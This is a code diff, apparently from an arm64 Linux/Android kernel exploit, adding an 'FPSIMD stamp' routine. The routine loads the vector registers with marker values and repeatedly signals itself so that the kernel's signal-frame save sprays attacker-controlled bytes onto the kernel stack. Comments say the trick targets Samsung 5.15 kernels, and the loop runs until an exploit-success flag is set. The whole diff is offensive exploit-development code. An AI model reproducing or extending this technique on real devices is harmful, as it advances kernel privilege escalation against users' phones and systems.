@@ -114,6 +114,7 @@ uint64_t fdset_get_word(const fd_set *set, int word) {
 static uintptr_t fops_runtime_text(uint64_t table_off, uint64_t fallback_off);
 
 #include <netinet/in.h>
+#include <signal.h>
 
 static int pselect_words_per_set(void) {
   int bits_per_word = (int)(8 * sizeof(unsigned long));
@@ -1987,6 +1988,8 @@ int selfstamp_prestage(void) {
 
 #define SYS_syslog 116
 
+static void fpsimd_nop_handler(int sig) { (void)sig; }
+
 static void ss_flow(const char *m) {
   if (!env_flag("FLOW_LOG", 0))
     return; /* ungated file writes from the waiter clobber the stamp region
@@ -2120,6 +2123,42 @@ void selfstamp_route(void) {
         }
         if (mfd >= 0)
           close(mfd);
+      }
+      /* FPSIMD stamp: load v0-v7 with FEED tags, self-signal — the
+       * sigframe FPSIMD save writes 128B of controlled data at the
+       * signal-frame depth (DEEPER than syscall frames — the Samsung
+       * 5.15 route). Interleave with select spin for dual coverage. */
+      if (env_flag("FPSIMD_STAMP", 0)) {
+        static struct sigaction sa_set;
+        if (!sa_set.sa_handler) {
+          sa_set.sa_handler = SIG_DFL; /* minimal: SIGUSR1 default = term! */
+          /* NO — need a real handler: use a no-op function */
+        }
+        /* install no-op handler once */
+        {
+          static int installed = 0;
+          if (!installed) {
+            struct sigaction sa2;
+            memset(&sa2, 0, sizeof(sa2));
+            sa2.sa_handler = fpsimd_nop_handler;
+            sa2.sa_flags = SA_RESTART;
+            sigaction(SIGUSR2, &sa2, NULL);
+            installed = 1;
+          }
+        }
+        uint64_t ft[8];
+        for (int i = 0; i < 8; i++)
+          ft[i] = 0xFEED0000000000C0ULL + (uint64_t)(i + 2);
+        for (int fspin = 0; fspin < 2000; fspin++) {
+          __asm__ volatile(
+              "ldp q0, q1, [%0]\n ldp q2, q3, [%0, #32]\n"
+              "ldp q4, q5, [%0, #64]\n ldp q6, q7, [%0, #96]\n"
+              :: "r"(ft)
+              : "v0", "v1", "v2", "v3", "v4", "v5", "v6", "v7");
+          syscall(SYS_tgkill, getpid(), syscall(SYS_gettid), SIGUSR2);
+          if (atomic_load(&consumer_success) >= 1)
+            break;
+        }
       }
       for (;;) {
         select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &tv0);
